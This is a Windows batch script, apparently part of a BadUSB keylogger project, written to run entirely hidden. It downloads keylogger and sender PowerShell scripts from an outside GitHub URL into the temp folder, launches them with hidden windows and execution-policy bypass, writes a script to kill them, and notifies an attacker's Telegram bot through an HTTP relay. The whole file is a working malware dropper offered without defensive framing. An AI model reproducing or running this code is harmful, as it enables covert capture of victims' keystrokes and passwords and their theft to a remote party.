@echo off
:: StealthManager.bat - Fully Hidden Execution
:: Purpose: Main script runs invisibly and launches child processes without any visible windows

:: Phase 1: Hide the console window immediately
if not defined minimized (
    set minimized=1
    start /min cmd /c "%~dpnx0"
    exit
)

:: Phase 2: Set file paths in temp directory
set "kl_path=%temp%\kl.ps1"
set "sn_path=%temp%\sn.ps1"
set "killer_path=%temp%\killer.bat"

:: Phase 3: Download required files with error handling (silent mode)
if not exist "%kl_path%" (
    powershell -window hidden -command "try { Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/0xAbolfazl/BadUSB/refs/heads/master/Digispark/KeyLogger/UsingTelegramBot/KeyLogger.ps1' -OutFile '%kl_path%' -ErrorAction Stop } catch { exit 1 }"
    if errorlevel 1 exit /b 1
)

if not exist "%sn_path%" (
    powershell -window hidden -command "try { Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/0xAbolfazl/BadUSB/refs/heads/master/Digispark/KeyLogger/UsingTelegramBot/Sender.ps1' -OutFile '%sn_path%' -ErrorAction Stop } catch { exit 1 }"
    if errorlevel 1 exit /b 1
)

:: Phase 4: Execute both scripts with triple-layer hidden execution
:: 1. Hidden PowerShell parent process
:: 2. Hidden window style parameter
:: 3. Hidden child process creation
powershell -window hidden -command "Start-Process powershell.exe -ArgumentList '-NoLogo','-WindowStyle','Hidden','-ExecutionPolicy','Bypass','-File','%kl_path%' -WindowStyle Hidden -ErrorAction Stop"

powershell -window hidden -command "Start-Process powershell.exe -ArgumentList '-NoLogo','-WindowStyle','Hidden','-ExecutionPolicy','Bypass','-File','%sn_path%' -WindowStyle Hidden -ErrorAction Stop"

:: Phase 5: Create silent killer script
(
    echo @echo off
    echo taskkill /f /im powershell.exe /fi "COMMANDLINE eq -file %kl_path%" 2^>nul
    echo taskkill /f /im powershell.exe /fi "COMMANDLINE eq -file %sn_path%" 2^>nul
    echo exit
) > "%killer_path%"

:: Phase 6: Send silent success notification to Telegram
powershell -window hidden -command "$body = @{UrlBox='https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={admin_chat_id}&text=KeyLogger+Executed+successfully'; AgentList='Mozilla Firefox'; VersionsList='HTTP/1.1'; MethodList='POST'}; try { $null = Invoke-WebRequest -Uri 'https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx' -Method Post -Body $body -ContentType 'application/x-www-form-urlencoded' -ErrorAction Stop } catch {}"

:: Exit silently without any trace
exit